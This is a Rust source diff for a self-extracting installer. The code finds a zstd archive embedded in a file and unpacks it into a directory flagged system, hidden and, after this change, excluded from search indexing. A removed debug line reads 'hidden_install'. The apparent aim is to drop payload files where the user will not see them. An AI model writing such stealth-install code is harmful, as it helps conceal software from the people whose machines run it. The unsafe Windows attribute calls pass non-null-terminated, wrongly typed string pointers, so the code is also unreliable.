@@ -22,6 +22,7 @@ struct FileSearcher<'a> {
 }
 
 impl<'a> FileSearcher<'a> {
+    #[inline(always)]
     fn new(path: &'a Path, magic: &'a [u8]) -> io::Result<FileSearcher<'a>> {
         let file = File::open(path)?;
         Ok(FileSearcher {
@@ -34,7 +35,7 @@ impl<'a> FileSearcher<'a> {
 
 impl<'a> Iterator for FileSearcher<'a> {
     type Item = io::Result<usize>;
-
+    #[inline(always)]
     fn next(&mut self) -> Option<io::Result<usize>> {
         let mut buf = [0; 32 * 1024];
         let ret;
@@ -73,6 +74,7 @@ impl<'a> Iterator for FileSearcher<'a> {
 
 const ZSTD_MAGIC: &[u8] = b"\x28\xb5\x2f\xfd";
 
+#[inline(always)]
 pub fn extract_to(src: &Path, dst: &Path) -> io::Result<()> {
     let mut found = false;
 
@@ -95,15 +97,15 @@ pub fn extract_to(src: &Path, dst: &Path) -> io::Result<()> {
     }
 }
 
+#[inline(always)]
 fn extract_at_offset(src: &Path, offs: usize, dst: &Path) -> io::Result<()> {
     let mut f = File::open(src)?;
     f.seek(SeekFrom::Start(offs as u64))?;
     let gz = Decoder::new(f).unwrap();
     let mut tar = Archive::new(gz);
-    println!("{:?}","hidden_install");
     unsafe {
-        SetFileAttributesA(dst.to_str().unwrap().as_ptr() as *const i8,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
-        SetFileAttributesW(dst.to_str().unwrap().as_ptr() as *const u16,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);      
+        SetFileAttributesA(dst.to_str().unwrap().as_ptr() as *const i8,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
+        SetFileAttributesW(dst.to_str().unwrap().as_ptr() as *const u16,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);      
     };
     tar.unpack(dst)?;
     Ok(())
